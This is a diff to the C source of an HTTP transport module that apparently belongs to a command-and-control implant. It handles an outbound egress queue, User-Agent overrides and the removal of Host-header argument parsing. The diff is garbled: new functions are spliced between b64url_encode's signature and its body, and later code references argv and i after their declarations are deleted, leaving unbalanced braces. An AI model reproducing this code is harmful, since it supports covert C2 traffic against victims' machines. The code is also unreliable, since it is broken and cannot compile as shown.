@@ -41,7 +41,6 @@ struct http_ctx {
 	bool online;
 };
 
-static int add_header(struct http_ctx *ctx, const char *header);
 static void reset_profile_headers(struct http_ctx *ctx);
 static void http_ctx_free(struct http_ctx *ctx);
 
@@ -51,6 +50,14 @@ static void http_ctx_free(struct http_ctx *ctx);
  * with the other encode/decode helpers; the buffer is null-terminated.
  */
 static unsigned char *b64url_encode(const void *src, size_t src_len, size_t *out_len)
+
+int http_transport_egress_pending(struct c2_transport *t)
+{
+	struct http_ctx *ctx = c2_transport_get_ctx(t);
+	return buffer_queue_len(ctx->egress) > 0;
+}
+
+static void patch_uri(struct http_ctx *ctx, struct buffer_queue *q)
 {
 	unsigned char *b64 = malloc(B64_ENCODED_LEN(src_len));
 	if (!b64) return NULL;
@@ -693,20 +700,16 @@ int http_transport_init(struct c2_transport *t)
 	}
 
 	/* Legacy: parse args after | in URI */
-	char *args = strchr(ctx->uri, '|');
-	if (args) {
-		*args = '\0';
-		if (strlen(++args)) {
-			size_t argc = 0;
-			char **argv = argv_split(args, NULL, &argc);
-			for (size_t i = 0; i + 1 < argc && argv[i + 1]; i += 2) {
-				if (strcmp(argv[i], "--host") == 0) {
-					char *host_header = NULL;
-					if (asprintf(&host_header, "Host: %s", argv[i + 1]) != -1) {
-						add_header(ctx, host_header);
-						free(host_header);
-					}
-				}
+	const char *ua = c2_transport_ua(t);
+	if (ua) {
+		ctx->data.ua = strdup(ua);
+		log_info("ua: %s", ctx->data.ua);
+	}
+
+	const char *raw_args = c2_transport_args(t);
+	if (raw_args && strlen(raw_args)) {
+		char *args = strdup(raw_args);
+		if (args) {
 				if (strcmp(argv[i], "--ua") == 0) {
 					free(ctx->data.ua);
 					ctx->data.ua = strdup(argv[i + 1]);
